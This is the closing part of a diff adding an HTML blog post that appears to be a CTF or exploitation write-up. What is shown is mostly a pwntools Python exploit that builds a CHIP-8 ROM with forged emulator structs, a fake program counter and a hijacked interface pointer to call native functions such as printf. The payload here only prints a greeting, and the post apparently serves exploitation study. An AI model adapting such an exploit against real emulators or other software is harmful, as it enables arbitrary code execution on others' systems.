+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">seeked_pc</span><span class="p">)</span>
+        <span class="k">assert</span> <span class="n">seeked_pc</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">pc</span>
+        <span class="k">assert</span> <span class="n">seeked_pc</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">((</span><span class="n">seeked_pc</span><span class="o">-</span><span class="bp">self</span><span class="p">.</span><span class="n">pc</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">nop</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">seeked_pc</span>
+
+    <span class="k">def</span> <span class="nf">label</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">pc</span>
+
+    <span class="k">def</span> <span class="nf">write_qword_le</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">qword</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">qword</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">write_bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">native_call_primitive</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">address</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">write_qword_le</span><span class="p">(</span><span class="n">PLAY_CHIP_ADDR</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_sound</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">while</span> <span class="bp">self</span><span class="p">.</span><span class="n">instructions</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">nop</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">assemble</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">code</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Placing fake music interface object at address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">INTERFACE_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s"> (chip8 addr </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">INTERFACE_ADDR</span> <span class="o">-</span> <span class="n">CHIP_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Execution starts at pc = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(((</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">asm</span> <span class="o">=</span> <span class="n">Asm</span><span class="p">()</span>
+
+    <span class="n">_start</span> <span class="o">=</span> <span class="n">asm</span><span class="p">.</span><span class="n">label</span><span class="p">()</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">jump</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">seek_pc</span><span class="p">(</span><span class="mh">0x222</span><span class="p">)</span>
+    <span class="c1"># at this point the machine is 'booted': profit
+</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s">"hello from the chip8!</span><span class="se">\n\0</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+
+    <span class="c1"># more booting code
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">seek_pc</span><span class="p">(((</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="n">_start</span><span class="p">)</span>
+
+    <span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">.</span><span class="n">assemble</span><span class="p">()</span>
+
+    <span class="n">forged_chip_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">PC_OFFSET</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">forged_chip_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p16</span><span class="p">((</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># forged pc
+</span>    <span class="n">forged_chip_struct</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">SP_OFFSET</span> <span class="o">-</span> <span class="n">PC_OFFSET</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">forged_chip_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">SP_VALUE</span><span class="p">)</span> <span class="c1"># forged sp
+</span>    <span class="n">forged_chip_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">forged_chip_struct</span><span class="p">,</span> <span class="n">CHIP_STRUCT_SIZE</span> <span class="o">-</span> <span class="n">ROM_START_OFFSET</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+
+    <span class="c1"># interface
+</span>    <span class="n">forged_music_struct</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">INTERFACE_ADDR</span><span class="p">)</span> <span class="c1"># put the interface into chip8's memory
+</span>    <span class="c1"># context
+</span>    <span class="n">forged_music_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CHIP_ADDR</span><span class="p">)</span> <span class="c1"># point context into the start of chip8's memory
+</span>    <span class="c1"># just pad the rest of the values with zeros
+</span>    <span class="n">forged_music_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">forged_music_struct</span><span class="p">,</span> <span class="mi">1056</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">forged_music_interface_struct</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">72</span>
+    <span class="n">forged_music_interface_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span>
+    <span class="n">forged_music_interface_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">forged_music_interface_struct</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">rom</span> <span class="o">=</span> <span class="n">forged_chip_struct</span>
+    <span class="n">rom</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">-</span> <span class="p">(</span><span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="n">ROM_START_OFFSET</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">forged_chip_struct</span><span class="p">)))</span>
+    <span class="n">rom</span> <span class="o">+=</span> <span class="n">forged_music_struct</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">rom</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">exploit</span><span class="p">()</span>
+</code></pre></div></div>
+
+</article>
+
+<div class="post-nav">
+    <div>
+        
+            Hey this is the first post!
+        
+    </div>
+    <div>
+        
+            No more recent posts, sorry!
+        
+    </div>
+</div>
+            </main>
+        
+            <footer>
+                Copyright - Luca Bertozzi - Made with Jekyll
+            </footer>
+    </div>
+</body>
+
+</html>
